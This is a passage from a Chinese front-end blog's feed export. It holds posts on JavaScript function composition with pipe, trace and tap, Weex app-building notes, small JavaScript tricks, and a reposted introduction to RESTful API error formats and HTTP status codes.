<p>骨灰级的函数式程序员用函数组合定义他们的整个应用程序。而我经常用它来消除临时变量。仔细看看 pipe() 版本的 toSlug()，你会发现一些特殊之处。</p>
<p>在命令式编程中，在一些变量上执行转换时，在转换的每个步骤中都会找到对变量的引用。而上面的 pipe() 实现是用无点的风格写的，就是说完全找不到它要操作的参数。</p>
<p>我经常将管道（pipe）用在像单元测试和 Redux 状态 reducer 这类事情上，用来消除中间变量。中间变量的存在只用来保存一个操作到下一个操作之间的临时值。</p>
<p>这玩意开始听起来会比较古怪，不过随着你用它练习，会发现在函数式编程中，你是在和相当抽象、广义的函数打交道，而在这样的函数中，事物的名称没那么重要。名称只会碍事。你会开始把变量当作是多余的样板。</p>
<p>就是说，我认为无点风格可能会被用过头。它可能会变得太密集，较难理解。但是如果你搞糊涂了，这里有一个小窍门…你可以利用 flow 来跟踪是怎么回事：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> trace = curry(<span class="function">(<span class="params">label, x</span>) =&gt;</span> &#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">`== <span class="subst">$&#123; label &#125;</span>:  <span class="subst">$&#123; x &#125;</span>`</span>);</div><div class="line">  <span class="keyword">return</span> x;</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>如下是你用它来跟踪的方法：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> toSlug = pipe(</div><div class="line">  trace(<span class="string">'input'</span>),</div><div class="line">  split(<span class="string">' '</span>),</div><div class="line">  map(toLowerCase),</div><div class="line">  trace(<span class="string">'after map'</span>),</div><div class="line">  join(<span class="string">'-'</span>),</div><div class="line">  <span class="built_in">encodeURIComponent</span></div><div class="line">);</div><div class="line"> </div><div class="line"><span class="built_in">console</span>.log(toSlug(<span class="string">'JS Cheerleader'</span>));</div><div class="line"><span class="comment">// '== input:  JS Cheerleader'</span></div><div class="line"><span class="comment">// '== after map:  js,cheerleader'</span></div><div class="line"><span class="comment">// 'js-cheerleader'</span></div></pre></td></tr></table></figure>
<p>trace() 只是更通用的 tap() 的一种特殊形式，它可以让你对流过管道的每个值执行一些行为。明白了么？管道（Pipe）？水龙头(Tap)？可以像下面这样编写 tap()：</p>
<blockquote>
<p>const tap = curry((fn, x) =&gt; {<br>  fn(x);<br>  return x;<br>});</p>
</blockquote>
<p>现在你可以看到为嘛 trace() 只是一个特殊情况下的 tap() 了：</p>
<blockquote>
<p>const trace = label =&gt; {<br>  return tap(x =&gt; console.log(<code>== ${ label }:  ${ x }</code>));<br>};</p>
</blockquote>
<p>你应该开始对函数式编程是什么样子，以及偏函数应用和柯里化如何与函数组合协作，来帮助你编写可读性更强的程序有点感觉了。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;转帖：&lt;a href=&quot;http://www.zcfy.cc/article/master-the-javascript-interview-what-is-function-composition-2160.html&quot;&gt;http://www.zcfy.cc/article/master-the-javascript-interview-what-is-function-composition-2160.html&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;函数式编程正在接管 JavaScript 世界。就在几年前，只有少数 JavaScript 程序员知道函数式编程是什么。然而，在过去 3 年内，我所看到的每个大型应用程序代码库都大量用到了函数式编程理念。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;函数组合就是&lt;font color=red&gt;&lt;code&gt;组合两到多个函数来生成一个新函数&lt;/code&gt;&lt;/font&gt;的过程。将函数组合在一起，就像将一连串管道扣合在一起，让数据流过一样。&lt;/p&gt;
&lt;p&gt;简而言之，函数 f 和 g 的组合可以被定义为 f(g(x))，从内到外（从右到左）求值。也就是说，求值顺序是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1.x&lt;/li&gt;
&lt;li&gt;2.g&lt;/li&gt;
&lt;li&gt;3.f&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;下面我们在代码中更近距离观察一下这个概念。假如你想把用户的全名转换为 URL Slug，给每个用户一个个人信息页面。为了实现此需求，你需要经历一连串的步骤：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1.将姓名根据空格分拆（split）到一个数组中&lt;/li&gt;
&lt;li&gt;2.将姓名映射（map）为小写&lt;/li&gt;
&lt;li&gt;3.用破折号连接（join）&lt;/li&gt;
&lt;li&gt;4.编码 URI 组件&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="Javascript" scheme="https://ganchengyuan1990.github.io/blog/tags/Javascript/"/>
    
  </entry>
  
  <entry>
    <title>Weex首秀(2)</title>
    <link href="https://ganchengyuan1990.github.io/blog/2017/02/03/Weex%E9%A6%96%E7%A7%80-2/"/>
    <id>https://ganchengyuan1990.github.io/blog/2017/02/03/Weex首秀-2/</id>
    <published>2017-02-03T01:13:58.000Z</published>
    <updated>2017-02-04T01:44:01.783Z</updated>
    
    <content type="html"><![CDATA[<p>首先祝各位鸡年大吉，开工大吉！<br>趁着今天刚开工，工作任务还不多，可以继续学些Weex。</p>
<p>春节在家无聊的时候，继续跟进了一下Weex的学习，主要把“关于我”这个Page进行了一些优化，这里主要是一些体力活，并没有太多可说的，简单总结以下几点：</p>
<ol>
<li>Weex中所有的文字都要放在<text></text>这个标签里，在普通的网页开发甚至Vue开发中，我偶尔会直接把文字放在div标签里，但是Weex中并不识别这样的语法。</li>
<li>Weex的页面布局虽然也使用css语法，但是与Vue以及普通页面并不完全相同，我试验了一下，text-align：center必须用在text标签上，才能使文字居中，但是因为HTML并没有这个标签，所以要加载文字所在的父标签上，这个要注意，另外就是建议在Weex中多应用flex布局。</li>
</ol>
<p><img src="http://a1.qpic.cn/psb?/V13vDRwo3fkyn1/6E7yWmWrZhjLpXTmocVFN0zQ4uItlntAzvV6pE2IrOQ!/b/dHgBAAAAAAAA&ek=1&kp=1&pt=0&bo=gAJyBAAAAAAFF8A!&tm=1486101600&sce=60-1-1&rf=viewer_4" alt=""></p>
<a id="more"></a>
<h2 id="外部链接问题"><a href="#外部链接问题" class="headerlink" title="外部链接问题"></a>外部链接问题</h2><p>在“关于我”这个page中，有一个需求，就是链接到外部网站，因为之前缺少APP开发经验，所以我想当然地认为这个问题非常简单，只需要价格a标签，或者像Vue一样采用Router的方法就可以了，但是后来发现这样并不能正常work。</p>
<p>仔细一看，Demo中所有Router都是链接到项目内部页面的，看地址栏上每个页面其实都是一个经过build的Js文件，这点应该和Vue是类似的，但这个并不符合我的需求，并且外部网站是传统的静态页面，因此还是需要解决。</p>
<p>首先抓包看看访问的URL是否正确:<br><img src="http://a1.qpic.cn/psb?/V13vDRwo3fkyn1/z5K4m3ngfB3dEJJAuaqBgGcY*iDwjDnPJBrkrYj3XHE!/b/dHgBAAAAAAAA&ek=1&kp=1&pt=0&bo=zAXwAQAAAAADFwo!&tm=1486101600&sce=60-1-1&rf=viewer_4" alt=""><br>由上图看 <a href="http://m.feiniu.com/my/order/index.html" target="_blank" rel="external">http://m.feiniu.com/my/order/index.html</a> 这个请求地址应该没有错，所以有可能是兼容问题。</p>
<p>于是尝试捕捉error<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"> &lt;web <span class="class"><span class="keyword">class</span></span>=<span class="string">"content"</span> id=<span class="string">"webview"</span> src=<span class="string">'https://m.taobao.com/?spm=0.0.0.0&amp;v=0#index'</span> onpagestart=<span class="string">"startload"</span> onpagefinish=<span class="string">"finishload"</span> onerror=<span class="string">"failload"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">web</span>&gt;</span></span></div><div class="line"></div><div class="line">startload: <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</div><div class="line">  modal.toast(&#123; <span class="attr">message</span>: <span class="string">'pagestart'</span> &#125;)</div><div class="line">&#125;,</div><div class="line"><span class="attr">finishload</span>: <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</div><div class="line">  modal.toast(&#123; <span class="attr">message</span>: <span class="string">'finishload'</span> &#125;)</div><div class="line">&#125;,</div><div class="line"><span class="attr">failload</span>: <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</div><div class="line">  modal.toast(&#123; <span class="attr">message</span>: event &#125;)</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>使用不同的机器进行测试，安卓手机触发到了finishload事件，而IPHONE触发了failload事件，但是两个手机都无法正常显示网页。</p>
<p>最后我在官方文档中查到这个：<br><img src="http://a2.qpic.cn/psb?/V13vDRwo3fkyn1/uOXEYdzmmH40UAf8AWaITXA3mv3PRAfT8X45fjHXRKM!/b/dHkBAAAAAAAA&ek=1&kp=1&pt=0&bo=IAOIAAAAAAAFF58!&tm=1486101600&sce=60-1-1&rf=viewer_4" alt=""><br>web组件要求的weex版本是v0.5+，但是我的项目中用的是v0.32的，所以说看起来还是得仔细查查手册啊，之前在Vue项目中也碰到过这种组件兼容性问题。<br><img src="http://a2.qpic.cn/psb?/V13vDRwo3fkyn1/FlzuiCrAAnOljF75iR1DSm2X9wHfLu0X2q6uU83coDc!/b/dHkBAAAAAAAA&ek=1&kp=1&pt=0&bo=gAL1AgAAAAAFF0E!&tm=1486101600&sce=60-1-1&rf=viewer_4" alt=""></p>
<p>目前怀疑就是这个问题导致无法正常使用webview（未完待续）。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;首先祝各位鸡年大吉，开工大吉！&lt;br&gt;趁着今天刚开工，工作任务还不多，可以继续学些Weex。&lt;/p&gt;
&lt;p&gt;春节在家无聊的时候，继续跟进了一下Weex的学习，主要把“关于我”这个Page进行了一些优化，这里主要是一些体力活，并没有太多可说的，简单总结以下几点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Weex中所有的文字都要放在&lt;text&gt;&lt;/text&gt;这个标签里，在普通的网页开发甚至Vue开发中，我偶尔会直接把文字放在div标签里，但是Weex中并不识别这样的语法。&lt;/li&gt;
&lt;li&gt;Weex的页面布局虽然也使用css语法，但是与Vue以及普通页面并不完全相同，我试验了一下，text-align：center必须用在text标签上，才能使文字居中，但是因为HTML并没有这个标签，所以要加载文字所在的父标签上，这个要注意，另外就是建议在Weex中多应用flex布局。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&quot;http://a1.qpic.cn/psb?/V13vDRwo3fkyn1/6E7yWmWrZhjLpXTmocVFN0zQ4uItlntAzvV6pE2IrOQ!/b/dHgBAAAAAAAA&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=gAJyBAAAAAAFF8A!&amp;tm=1486101600&amp;sce=60-1-1&amp;rf=viewer_4&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Vue" scheme="https://ganchengyuan1990.github.io/blog/tags/Vue/"/>
    
  </entry>
  
  <entry>
    <title>Weex首秀(1)</title>
    <link href="https://ganchengyuan1990.github.io/blog/2017/01/25/Weex%E9%A6%96%E7%A7%80/"/>
    <id>https://ganchengyuan1990.github.io/blog/2017/01/25/Weex首秀/</id>
    <published>2017-01-25T01:59:15.000Z</published>
    <updated>2017-02-04T07:14:02.458Z</updated>
    
    <content type="html"><![CDATA[<p>一直想做一个APP，去年也自学过一段时间的<code>React Native</code>, 但是RN相对来说学习曲线比较陡峭，并且很多资源包在下载时都不是那么容易，经常error（这个大家都懂）, 所以这事儿就不了了之了。</p>
<p>前两天看了weex的会议，觉得阿里又在放大招了，这个工具虽然目前学习社区不多，资源组件不丰富，但是本身调式来发非常便捷，weex playground非常不错，并且因为weex是基于vue的，所以入门简单，<code>npm run build</code>打包以后部署到自己的服务器上，用二维码扫描以后就可以拥有一个自己的APP了，并且是兼容三端的，这一点非常诱人。</p>
<p>于是，我就从github上找到了一个别人的项目，<a href="https://github.com/dodola/WeexOne" target="_blank" rel="external">https://github.com/dodola/WeexOne</a>，然后改造一个属于自己的APP。<br>总体样式如下：<br><img src="http://wx1.sinaimg.cn/mw690/77e455bfgy1fc2p0orh1pj20k00zk42q.jpg" alt=""><br><a id="more"></a></p>
<p>开始动手！</p>
<p>首先，引入了picker组件，这个组件用来进行时间选择，前端效果不错。<br><img src="http://wx1.sinaimg.cn/mw690/77e455bfgy1fc2p0oo2ajj20k00zkdh6.jpg" alt=""><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">require</span>(<span class="string">'weex-components'</span>);</div><div class="line">   <span class="keyword">const</span> picker = <span class="built_in">require</span>(<span class="string">'@weex-module/picker'</span>);</div><div class="line"> <span class="keyword">export</span> <span class="keyword">default</span> &#123;</div><div class="line">   data () &#123;</div><div class="line">     <span class="keyword">return</span> &#123;</div><div class="line">       <span class="attr">value</span>: <span class="string">''</span></div><div class="line">     &#125;</div><div class="line">   &#125;,</div><div class="line">   <span class="attr">methods</span>: &#123;</div><div class="line">     pickTime () &#123;</div><div class="line">       picker.pickTime(&#123;</div><div class="line">         <span class="attr">value</span>: <span class="keyword">this</span>.value</div><div class="line">       &#125;, event =&gt; &#123;</div><div class="line">         <span class="keyword">if</span> (event.result === <span class="string">'success'</span>) &#123;</div><div class="line">           <span class="keyword">this</span>.value = event.data</div><div class="line">         &#125;</div><div class="line">       &#125;)</div><div class="line">     &#125;</div><div class="line">   &#125;</div><div class="line"> &#125;</div></pre></td></tr></table></figure></p>
<p>接下来想尝试一下vue中的组件能否在weex中使用，比如UI组件mint，并且引入API数据。</p>
<p>未完待续。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一直想做一个APP，去年也自学过一段时间的&lt;code&gt;React Native&lt;/code&gt;, 但是RN相对来说学习曲线比较陡峭，并且很多资源包在下载时都不是那么容易，经常error（这个大家都懂）, 所以这事儿就不了了之了。&lt;/p&gt;
&lt;p&gt;前两天看了weex的会议，觉得阿里又在放大招了，这个工具虽然目前学习社区不多，资源组件不丰富，但是本身调式来发非常便捷，weex playground非常不错，并且因为weex是基于vue的，所以入门简单，&lt;code&gt;npm run build&lt;/code&gt;打包以后部署到自己的服务器上，用二维码扫描以后就可以拥有一个自己的APP了，并且是兼容三端的，这一点非常诱人。&lt;/p&gt;
&lt;p&gt;于是，我就从github上找到了一个别人的项目，&lt;a href=&quot;https://github.com/dodola/WeexOne&quot;&gt;https://github.com/dodola/WeexOne&lt;/a&gt;，然后改造一个属于自己的APP。&lt;br&gt;总体样式如下：&lt;br&gt;&lt;img src=&quot;http://wx1.sinaimg.cn/mw690/77e455bfgy1fc2p0orh1pj20k00zk42q.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;
    
    </summary>
    
    
      <category term="Vue" scheme="https://ganchengyuan1990.github.io/blog/tags/Vue/"/>
    
  </entry>
  
  <entry>
    <title>javascript小技巧</title>
    <link href="https://ganchengyuan1990.github.io/blog/2017/01/24/javascript%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
    <id>https://ganchengyuan1990.github.io/blog/2017/01/24/javascript小技巧/</id>
    <published>2017-01-24T02:52:27.000Z</published>
    <updated>2017-02-04T01:41:25.160Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p><code>计算最小值</code><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">smallest</span>(<span class="params">array</span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> <span class="built_in">Math</span>.min.apply(<span class="built_in">Math</span>, array);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="built_in">console</span>.log(smallest([<span class="number">9</span>,<span class="number">13</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">33</span>])); <span class="comment">//7</span></div></pre></td></tr></table></figure></p>
<p><code>巧用call方法</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">function useCall() &#123;</div><div class="line">    [].forEach.call(arguments, function(val, key) &#123;</div><div class="line">        console.log(key, val)</div><div class="line">    &#125;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">useCall(&apos;Bob Dylan&apos;, &apos;Bob Marley&apos;, &apos;Steve Vai&apos;);//Bob Dylan, Bob Marley, Steve Vai</div></pre></td></tr></table></figure></p>
</blockquote>
<a id="more"></a>
<blockquote>
<p><code>如何理解Vue中的setter和getter</code><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> Coder = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">        <span class="keyword">var</span> that = <span class="keyword">this</span>;</div><div class="line">        <span class="keyword">return</span> &#123;</div><div class="line">            get name()&#123;</div><div class="line">                <span class="keyword">if</span>(that.name)&#123;</div><div class="line">                    <span class="keyword">return</span> that.name</div><div class="line">                &#125;</div><div class="line">                <span class="keyword">return</span> <span class="string">'你还没有取名'</span></div><div class="line">            &#125;,</div><div class="line">            set name(val)&#123;</div><div class="line">                <span class="built_in">console</span>.log(<span class="string">'你把名字修成了'</span>+val)</div><div class="line">                that.name = val</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">var</span> isMe = <span class="keyword">new</span> Coder()</div><div class="line">    <span class="built_in">console</span>.log(isMe.name)</div><div class="line">    isMe.name = <span class="string">'周神'</span></div><div class="line">    <span class="built_in">console</span>.log(isMe.name)</div><div class="line">    <span class="built_in">console</span>.log(isMe)</div><div class="line"></div><div class="line"><span class="keyword">var</span> Coder = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    &#125;</div><div class="line">    Coder.prototype.__defineGetter__(<span class="string">'name'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.name) &#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.name</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            <span class="keyword">return</span> <span class="string">'你还没有取名'</span></div><div class="line">        &#125;</div><div class="line">    &#125;)</div><div class="line">    Coder.prototype.__defineSetter__(<span class="string">'name'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">val</span>) </span>&#123;</div><div class="line">        <span class="keyword">this</span>.name = val</div><div class="line">    &#125;)</div><div class="line">    <span class="keyword">var</span> isMe = <span class="keyword">new</span> Coder()</div><div class="line">    <span class="built_in">console</span>.log(isMe.name)</div><div class="line">    isMe.name = <span class="string">'周神'</span></div><div class="line">    <span class="built_in">console</span>.log(isMe.name)</div><div class="line">    <span class="built_in">console</span>.log(isMe)</div></pre></td></tr></table></figure></p>
</blockquote>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;计算最小值&lt;/code&gt;&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;smallest&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;array&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;Math&lt;/span&gt;.min.apply(&lt;span class=&quot;built_in&quot;&gt;Math&lt;/span&gt;, array);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(smallest([&lt;span class=&quot;number&quot;&gt;9&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;13&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;33&lt;/span&gt;])); &lt;span class=&quot;comment&quot;&gt;//7&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;巧用call方法&lt;/code&gt;&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;function useCall() &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    [].forEach.call(arguments, function(val, key) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        console.log(key, val)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;useCall(&amp;apos;Bob Dylan&amp;apos;, &amp;apos;Bob Marley&amp;apos;, &amp;apos;Steve Vai&amp;apos;);//Bob Dylan, Bob Marley, Steve Vai&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="Javascript" scheme="https://ganchengyuan1990.github.io/blog/tags/Javascript/"/>
    
  </entry>
  
  <entry>
    <title>Restful API初识</title>
    <link href="https://ganchengyuan1990.github.io/blog/2017/01/24/Restful-API%E5%88%9D%E8%AF%86/"/>
    <id>https://ganchengyuan1990.github.io/blog/2017/01/24/Restful-API初识/</id>
    <published>2017-01-24T01:57:30.000Z</published>
    <updated>2017-02-04T01:44:25.112Z</updated>
    
    <content type="html"><![CDATA[<p>转载：<a href="http://scarletsky.github.io/2016/11/30/error-handling-in-restful-api/" target="_blank" rel="external">http://scarletsky.github.io/2016/11/30/error-handling-in-restful-api/</a></p>
<p>Restful API这个概念是我这几天看博客才接触到的，但其实在日常开发中这个思想始终都占据着重要地位。</p>
<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>随着移动开发和前端开发的崛起，越来越多的 Web 后端应用都倾向于实现 Restful API。<br>Restful API 是一个简单易用的前后端分离方案，它只需要对客户端请求进行处理，然后返回结果即可， 无需考虑页面渲染，一定程度上减轻了后端开发人员的负担。<br>不过，这也意味着，有一些工作就必须由前端来完成了，比如错误处理。</p>
<p>当 Restful API 需要抛出错误的时候，我们要考虑的是：这个错误应该包含哪些信息。<br>我们先看看 Github, Google, Facebook, Twitter, Twilio 的错误信息是怎样的。</p>
<a id="more"></a>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//Github</span></div><div class="line">&#123;</div><div class="line">  <span class="string">"message"</span>: <span class="string">"Validation Failed"</span>,</div><div class="line">  <span class="string">"errors"</span>: [</div><div class="line">    &#123;</div><div class="line">      <span class="string">"resource"</span>: <span class="string">"Issue"</span>,</div><div class="line">      <span class="string">"field"</span>: <span class="string">"title"</span>,</div><div class="line">      <span class="string">"code"</span>: <span class="string">"missing_field"</span></div><div class="line">    &#125;</div><div class="line">  ]</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//Google</span></div><div class="line">&#123;</div><div class="line">  <span class="string">"error"</span>: &#123;</div><div class="line">    <span class="string">"errors"</span>: [</div><div class="line">      &#123;</div><div class="line">        <span class="string">"domain"</span>: <span class="string">"global"</span>,</div><div class="line">        <span class="string">"reason"</span>: <span class="string">"insufficientFilePermissions"</span>,</div><div class="line">        <span class="string">"message"</span>: <span class="string">"The user does not have sufficient permissions for file &#123;fileId&#125;."</span></div><div class="line">      &#125;</div><div class="line">    ],</div><div class="line">    <span class="string">"code"</span>: <span class="number">403</span>,</div><div class="line">    <span class="string">"message"</span>: <span class="string">"The user does not have sufficient permissions for file &#123;fileId&#125;."</span></div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//Facebook</span></div><div class="line">&#123;</div><div class="line">  <span class="string">"error"</span>: &#123;</div><div class="line">    <span class="string">"message"</span>: <span class="string">"Message describing the error"</span>, </div><div class="line">    <span class="string">"type"</span>: <span class="string">"OAuthException"</span>,</div><div class="line">    <span class="string">"code"</span>: <span class="number">190</span>,</div><div class="line">    <span class="string">"error_subcode"</span>: <span class="number">460</span>,</div><div class="line">    <span class="string">"error_user_title"</span>: <span class="string">"A title"</span>,</div><div class="line">    <span class="string">"error_user_msg"</span>: <span class="string">"A message"</span>,</div><div class="line">    <span class="string">"fbtrace_id"</span>: <span class="string">"EJplcsCHuLu"</span></div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>观察这些结构可以发现它们都有一些共同的地方：</p>
<ul>
<li>都利用了 Http 状态码</li>
<li>有些返回了业务错误码</li>
<li>都提供了给用户看的错误提示信息</li>
<li>有些提供了给开发者看的错误信息</li>
</ul>
<h3 id="设计错误类型"><a href="#设计错误类型" class="headerlink" title="设计错误类型"></a>设计错误类型</h3><p>我们刚才提到过，可以利用 Http 状态码来为错误类型进行分类。<br>通常我们所说的分类通常是对客户端错误进行分类， 即 4xx 类型的错误。</p>
<p>而这些错误类型中，我们最常用的是：</p>
<ol>
<li><p>400 Bad Request<br>由于包含语法错误，当前请求无法被服务器理解。除非进行修改，否则客户端不应该重复提交这个请求。<br>通常在请求参数不合法或格式错误的时候可以返回这个状态码。</p>
</li>
<li><p>401 Unauthorized<br>当前请求需要用户验证。<br>通常在没有登录的状态下访问一些受保护的 API 时会用到这个状态码。</p>
</li>
<li><p>403 Forbidden<br>服务器已经理解请求，但是拒绝执行它。与401响应不同的是，身份验证并不能提供任何帮助。<br>通常在没有权限操作资源时(如修改/删除一个不属于该用户的资源时)会用到这个状态码。</p>
</li>
<li><p>404 Not Found<br>请求失败，请求所希望得到的资源未被在服务器上发现。<br>通常在找不到资源时返回这个状态码。</p>
</li>
</ol>
<p>我个人习惯把错误分成以下几种类型：</p>
<ul>
